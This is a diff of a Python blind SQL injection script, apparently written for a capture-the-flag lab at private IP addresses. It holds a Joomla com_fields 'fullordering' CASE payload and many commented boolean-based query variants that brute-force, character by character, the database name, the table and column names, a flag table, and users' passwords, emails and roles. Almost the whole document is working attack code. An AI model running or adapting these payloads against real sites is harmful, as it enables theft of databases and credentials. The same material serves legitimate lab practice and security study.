@@ -13,14 +13,14 @@ for i in range(100):
 
 print("running...")
 
-target = "http://10.10.204.118/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)"
+target = "http://10.102.181.239/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)"
 
 condition = "1573=1573"
 
-#target = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR '1'='1"
+#target = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR '1'='1"
 
-#test = "Config correctly set"
-test = "The most recent request was denied because it contained an invalid security token. Please refresh the page and try again."
+test = "Config correctly set"
+#test = "The most recent request was denied because it contained an invalid security token. Please refresh the page and try again."
 
 chars = " -_abcdefghijklmnopqrstuvwxyz0123456789}{)($£!@./\\*][~';:,><`¬%\"\n"
 #chars = "0123456789"
@@ -41,52 +41,56 @@ counter = -1000
 
 
 answers = []
-for j in range(0, 20):
+for j in range(0, 200):
     
     tmp = "{}: ".format(j)
     tmpp = ""
     notFound = False
-    for i in range(1,20):
+    for i in range(1,40):
         letterFound = False
 
         #for char in range(0, 256):
         for char in chars:
             
-            # GET DB NAME
-            # query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING(DATABASE(),{},1)='{}".format(i, char)     
 
-            query = target.replace(condition, "SUBSTRING(DATABASE(),{},1)='{}'".format(i, char))
+            # SELECT name FROM sys.databases;
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT name FROM sys.databases() LIMIT {},1),{},1)='{}".format(j, i, char)   
+
+            # GET DB NAME
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING(DATABASE(),{},1)='{}".format(i, char)     
+
+            #query = target.replace(condition, "SUBSTRING(DATABASE(),{},1)='{}'".format(i, char))
 
             
             # GET TABLE NAMES
-            #query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)='{}".format(j, i, char) 
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)='{}".format(j, i, char) 
 
             # GET COLUMN NAME
-            #query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag_table' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)   
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag_table' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)   
 
 
                 
 
             # GET VALUE
-            #query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT password FROM users LIMIT {},1),{},1)='{}".format(j, i, char)     
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT password FROM users LIMIT {},1),{},1)='{}".format(j, i, char)     
             # GET VALUE
-            # query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT email FROM users LIMIT {},1),{},1)='{}".format(j, i, char)        
+            # query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT email FROM users LIMIT {},1),{},1)='{}".format(j, i, char)        
             # GET VALUE
-            # query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT name FROM users LIMIT {},1),{},1)='{}".format(j, i, char)         
+            # query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT name FROM users LIMIT {},1),{},1)='{}".format(j, i, char)         
 
             
             
             # GET VALUE
-            # query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT name FROM config LIMIT {},1),{},1)='{}".format(j, i, char)        
+            # query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT name FROM config LIMIT {},1),{},1)='{}".format(j, i, char)        
             # GET VALUE
-            # query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT value FROM config LIMIT {},1),{},1)='{}".format(j, i, char)       
+            # query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT value FROM config LIMIT {},1),{},1)='{}".format(j, i, char)       
 
 
 
 
 
             # get quick answer if table exists
-            # http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR IF(EXISTS (SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'flag_table'),"OK","NO")='OK
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR IF(EXISTS (SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'flag_table'),'OK','NO')='OK"
 
 
 
@@ -98,12 +102,12 @@ for j in range(0, 20):
             # GET VALUE
 
 
-            #query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)='{}' OR '".format(j, i, char)  # flag_table
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)='{}' OR '".format(j, i, char)  # flag_table
 
             
-            #query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag_table' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag_table' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag
             
-            #query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT flag FROM flag_table LIMIT {},1),{},1)=CHAR({}) OR '".format(j, i, char) 
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT flag FROM flag_table LIMIT {},1),{},1)=CHAR({}) OR '".format(j, i, char) 
 
 
 
@@ -111,31 +115,32 @@ for j in range(0, 20):
             #get files details
             # 
             #       
-            #query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)='{}' OR '".format(j, i, char)  # flag_table
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)='{}' OR '".format(j, i, char)  # flag_table
             
-            #query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='files' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='files' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag
             
-            #query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT file_name FROM files LIMIT {},1),{},1)='{}' OR '".format(j, i, char) 
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT file_name FROM files LIMIT {},1),{},1)='{}' OR '".format(j, i, char) 
 
 
 
 
 
-#            query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)='{}' OR '".format(j, i, char)  # flag_table
-#            query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_rows FROM information_schema.tables LIMIT {},1),{},1)='{}' OR '".format(j, i, char)  # flag_table
+#            query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)='{}' OR '".format(j, i, char)  # flag_table
+#            query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_rows FROM information_schema.tables LIMIT {},1),{},1)='{}' OR '".format(j, i, char)  # flag_table
 #
-#            query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='db' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag_table' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag
 #
-#            query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((COUNT(SELECT user FROM db LIMIT {},1),{},1))='{}".format(j, i, char)  
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((COUNT(SELECT user FROM db LIMIT {},1),{},1))='{}".format(j, i, char)  
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((COUNT(SELECT flag FROM flag_table LIMIT {},1),{},1))='{}".format(j, i, char)  
 #
-#            query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT email FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
-#            query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag
+#            query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT email FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
+#            query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag
 
-            #query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT email FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
-            #query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT password FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
-            #query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT name FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
-            #query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT role FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
-            #query = "http://10.102.52.81/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='tables_priv' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT email FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT password FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT name FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT role FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
+            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='tables_priv' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag
 
 
             #print(query)
@@ -143,6 +148,7 @@ for j in range(0, 20):
                 #print(char)
                 #tmp += chr(char)
                 tmp += str(char)
+                print(tmp)
                 #tmpp += chr(char)
                 #print('"' + tmp + '"')    
                 letterFound = True
